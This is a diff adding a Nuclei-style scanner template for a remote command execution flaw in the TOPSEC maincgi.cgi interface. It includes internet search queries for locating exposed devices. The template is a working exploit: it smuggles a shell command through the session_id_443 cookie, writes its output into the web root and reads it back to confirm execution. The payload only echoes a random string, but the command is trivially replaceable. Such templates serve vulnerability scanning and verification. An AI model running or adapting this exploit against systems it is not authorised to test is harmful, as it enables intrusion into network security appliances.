@@ -1,0 +1,41 @@
+id: topsec_maincgi_rce
+
+info:
+  name: 天融信TOPSEC_maincgi.cgi远程命令执行
+  author: Anonymous
+  severity: critical
+  description: 天融信TOPSEC 安全产品 maincgi 接口处存在 RCE 漏洞
+  metadata:
+    max-request: 1
+    fofa-query: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
+    quake-query: link_script_url:"/site/js/js_iepng.js" AND body:"/cgi/maincgi.cgi"
+    hunter-query: web.body:"/cgi/maincgi.cgi" AND web.title:"Web User Login"
+    verified: true
+tags: rce,topsec,network,hw
+    
+variables:
+  verifystr: '{{rand_base(5)}}'
+  cmd: 'echo "{{verifystr}}"'
+  filename: '{{to_lower(rand_base(5))}}'
+
+http:
+  - raw:
+      - |
+        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+        Cookie: session_id_443=1|{{cmd}} >> /www/htdocs/site/image/{{filename}}.txt;
+
+      - |
+        GET /site/image/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200
+          - contains(body_2, '{{verifystr}}')
+          - status_code_2==200
+        condition: and
+# digest: 4b0a0048304602210092e2727bfb7cc5ec1133a59986ea1b44081d417094cc2476eb34ffd009c0786a022100c2dcb6c3972596a5be5bb2960487ca82a132c4cf5ad96e0483239c443021a03c:6b2dd5af372f02ed15a56faf8ad98cf9
